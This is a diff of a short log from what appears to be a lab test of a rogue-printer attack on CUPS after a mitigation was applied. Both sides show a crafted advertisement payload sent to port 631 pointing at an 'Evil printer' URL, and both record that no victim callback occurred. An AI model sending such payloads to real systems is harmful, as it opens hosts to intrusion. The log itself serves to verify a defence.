@@ -1,5 +1,5 @@
-2026-11-16 21:11:35,394 INFO sniffing 12s for callbacks (filter: dst host 172.26.0.3 and dst port 12345)
-2026-11-16 21:11:35,897 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilPostMitig "Attacker lab" "Evil printer"'
-2026-11-16 21:11:47,411 INFO no victim callback within 12s
-2026-11-16 21:11:47,411 INFO captured 0 packet(s) after sending
-2026-11-16 21:11:47,414 INFO wrote 1 packet(s) to pcap_files/attack-after-mitigation.pcap
+2026-11-16 22:32:52,205 INFO sniffing 12s for callbacks (filter: dst host 172.26.0.3 and dst port 12345)
+2026-11-16 22:32:52,708 INFO sending variant=baseline advertise=172.26.0.3:12345 -> cups:631 payload=b'0 3 http://172.26.0.3:12345/printers/EvilPostMitig "Attacker lab" "Evil printer"'
+2026-11-16 22:33:04,230 INFO no victim callback within 12s
+2026-11-16 22:33:04,230 INFO captured 0 packet(s) after sending
+2026-11-16 22:33:04,234 INFO wrote 1 packet(s) to pcap_files/attack-after-mitigation.pcap
